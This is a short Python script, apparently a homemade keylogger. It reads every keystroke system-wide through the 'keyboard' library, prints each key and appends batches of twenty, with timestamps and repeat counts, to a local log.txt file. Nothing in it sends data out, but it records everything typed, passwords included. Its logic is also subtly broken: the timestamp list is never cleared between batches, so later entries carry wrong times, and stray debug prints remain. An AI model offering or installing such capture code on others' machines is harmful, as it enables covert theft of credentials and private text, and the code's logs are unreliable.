import keyboard
import os
import datetime

#####################################
# SETUP FILE
#####################################

if not os.path.exists("log.txt"):
    f = open("log.txt", "w")
    f.close()
f = open("log.txt", "a")

#####################################
# VARIABLES
#####################################

app = []
times = []
pre = ""

#####################################
# MAIN
#####################################

while True:
    k = keyboard.read_key()
    app.append(k)
    if k:
        times.append(datetime.datetime.now())
        print(k)
    if len(app) >= 20:
        print("no")
        output = ""
        prevLetter = ""
        reps = 0
        first = True
        i = 0
        for a in app:
            if a == prevLetter:
                reps += 1
                i += 1
            else:
                if not first:
                    output += "[" + str(times[i]) + "]: " + prevLetter + " {x" + str(reps) + "}\n"
                    i += 1
                prevLetter = a
                reps = 1
                first = False
        output += "[" + str(times[i]) + "]: " +  prevLetter + " {x" + str(reps) + "}\n"
        app = []
        f.write(output)
        f.close()
        f = open("log.txt", "a")
        print("no laod")